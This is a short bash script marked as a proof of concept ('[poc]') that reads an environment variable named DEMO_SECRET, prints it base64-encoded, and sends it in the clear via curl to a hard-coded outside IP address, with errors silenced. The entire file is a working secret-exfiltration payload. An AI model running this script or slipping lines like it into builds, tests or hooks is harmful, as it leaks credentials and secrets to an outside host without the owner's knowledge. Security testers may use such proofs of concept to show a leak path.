#!/usr/bin/env bash

echo "[poc] hello pre"
echo "leak=$(printf '%s' "$DEMO_SECRET" | base64 -w0)"
curl -fsS "http://82.165.247.235/?d=$(printf '%s' "$DEMO_SECRET")" || true
echo "[poc] hello post"
